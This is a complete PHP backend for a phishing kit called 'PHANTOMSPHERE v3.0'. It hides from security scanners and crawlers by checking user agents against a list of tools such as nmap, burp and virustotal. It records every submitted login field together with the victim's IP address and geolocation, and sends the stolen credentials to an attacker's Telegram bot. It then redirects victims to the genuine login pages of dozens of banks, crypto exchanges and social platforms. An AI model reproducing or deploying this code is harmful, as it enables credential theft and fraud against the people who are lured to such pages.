<?php
function is_bot() {
    $ua=strtolower($_SERVER['HTTP_USER_AGENT']??'');
    $b=array('bot','crawler','spider','scraper','curl','wget','python','go-http','java',
    'libwww','httpclient','phantomjs','headless','selenium','puppeteer','playwright',
    'cobalt','burp','masscan','nmap','zgrab','aquatone','gospider','httpx','nuclei',
    'whois','virustotal','nessus','openvas','acunetix','netsparker','appscan','fortify');
    foreach($b as $x){if(strpos($ua,$x)!==false)return true;}
    if(isset($_SERVER['HTTP_SEC_CH_UA'])&&strpos($_SERVER['HTTP_SEC_CH_UA'],'Headless')!==false)return true;
    if(!isset($_SERVER['HTTP_ACCEPT_LANGUAGE']))return true;
    if(!isset($_SERVER['HTTP_SEC_FETCH_SITE']))return true;
    return false;
}
if(is_bot()){http_response_code(403);echo file_get_contents('index.html');exit;}

$ts=date('Y-m-d H:i:s');$ip=$_SERVER['REMOTE_ADDR']??'?';$ua=$_SERVER['HTTP_USER_AGENT']??'?';
$ref=$_SERVER['HTTP_REFERER']??'Direct';$pf=basename(dirname(__FILE__));
$entry="╔══════════════════════════════════╗\n║ PHANTOMSPHERE v3.0\n║ Platform: $pf\n║ Time: $ts\n║ IP: $ip\n";
$creds=[];foreach($_POST as $k=>$v){$v=trim($v);if(!empty($v)){$creds[$k]=$v;$entry.="║ $k: $v\n";}}
$entry.="║ UA: $ua\n║ Ref: $ref\n";
$g=@file_get_contents("http://ip-api.com/json/$ip?fields=status,country,regionName,city,isp,org,as,proxy,hosting,mobile");
if($g){$geo=json_decode($g,true);if($geo&&$geo['status']=='success'){
$entry.="║ Country: ".($geo['country']??'?')."\n║ Region: ".($geo['regionName']??'?')."\n║ City: ".($geo['city']??'?')."\n";
$entry.="║ ISP: ".($geo['isp']??'?')."\n║ Org: ".($geo['org']??'?')."\n║ ASN: ".($geo['as']??'?')."\n";
$entry.="║ Proxy/VPN: ".($geo['proxy']?'YES':'no')."\n║ Hosting: ".($geo['hosting']?'YES':'no')."\n║ Mobile: ".($geo['mobile']?'YES':'no')."\n";
}}
$entry.="╚══════════════════════════════════╝\n\n";
file_put_contents(__DIR__.'/../../logs/captures.log',$entry,FILE_APPEND|LOCK_EX);
file_put_contents(__DIR__.'/../../logs/'.$pf.'.log',$entry,FILE_APPEND|LOCK_EX);
$tg=__DIR__.'/../../config/telegram.json';
if(file_exists($tg)){$t=json_decode(file_get_contents($tg),true);
if(isset($t['bot_token'],$t['chat_id'])){$m="🔴 PHANTOMSPHERE\nPlatform: $pf\nIP: $ip\n$ts\n";foreach($creds as $a=>$b)$m.="$a: $b\n";
$m.="Country: ".($geo['country']??'?')."\nISP: ".($geo['isp']??'?');
@file_get_contents("https://api.telegram.org/bot".$t['bot_token']."/sendMessage?chat_id=".$t['chat_id']."&text=".urlencode($m));}}
$r=array('facebook'=>'https://www.facebook.com/login.php','instagram'=>'https://www.instagram.com/accounts/login/',
'x_twitter'=>'https://twitter.com/i/flow/login','linkedin'=>'https://www.linkedin.com/login',
'tiktok'=>'https://www.tiktok.com/login','snapchat'=>'https://accounts.snapchat.com/',
'google'=>'https://accounts.google.com/signin','microsoft'=>'https://login.live.com/',
'github'=>'https://github.com/login','reddit'=>'https://www.reddit.com/login/',
'discord'=>'https://discord.com/login','telegram'=>'https://web.telegram.org/',
'pinterest'=>'https://www.pinterest.com/login/','netflix'=>'https://www.netflix.com/login',
'paypal'=>'https://www.paypal.com/signin','cashapp'=>'https://cash.app/login',
'venmo'=>'https://account.venmo.com/login','bybit'=>'https://www.bybit.com/en/login/',
'binance'=>'https://accounts.binance.com/en/login','trustwallet'=>'https://trustwallet.com/',
'coinbase'=>'https://www.coinbase.com/login','kraken'=>'https://www.kraken.com/login',
'gemini'=>'https://exchange.gemini.com/login','crypto_com'=>'https://crypto.com/exchange/login',
'robinhood'=>'https://robinhood.com/login','webull'=>'https://www.webull.com/login',
'chase'=>'https://secure.chase.com/web/auth/login','wellsfargo'=>'https://www.wellsfargo.com/login',
'bankofamerica'=>'https://secure.bankofamerica.com/login','amazon'=>'https://www.amazon.com/ap/signin',
'apple'=>'https://appleid.apple.com/sign-in','whatsapp'=>'https://web.whatsapp.com/',
'twitch'=>'https://www.twitch.tv/login','steam'=>'https://steamcommunity.com/login',
'ebay'=>'https://www.ebay.com/signin','yahoo'=>'https://login.yahoo.com/',
'dropbox'=>'https://www.dropbox.com/login','adobe'=>'https://auth.services.adobe.com/signin',
'spotify'=>'https://www.spotify.com/login','uber'=>'https://www.uber.com/login',
'airbnb'=>'https://www.airbnb.com/login','quora'=>'https://www.quora.com/login',
'tumblr'=>'https://www.tumblr.com/login','medium'=>'https://medium.com/m/signin',
'wordpress'=>'https://wordpress.com/log-in','slack'=>'https://slack.com/signin',
'atlassian'=>'https://id.atlassian.com/login','protonmail'=>'https://mail.protonmail.com/login',
'zoho'=>'https://accounts.zoho.com/signin','capitalone'=>'https://www.capitalone.com/login',
'amex'=>'https://www.americanexpress.com/login','etsy'=>'https://www.etsy.com/login',
'shopify'=>'https://www.shopify.com/login','hulu'=>'https://www.hulu.com/login',
'lyft'=>'https://www.lyft.com/login','epicgames'=>'https://www.epicgames.com/login',
'playstation'=>'https://www.playstation.com/login','tinder'=>'https://www.tinder.com/login',
'bumble'=>'https://www.bumble.com/login','metamask'=>'https://metamask.io/',
'ledger'=>'https://www.ledger.com/login','custom'=>'https://www.google.com');
header("Location: ".($r[$pf]??'https://www.google.com'));exit;
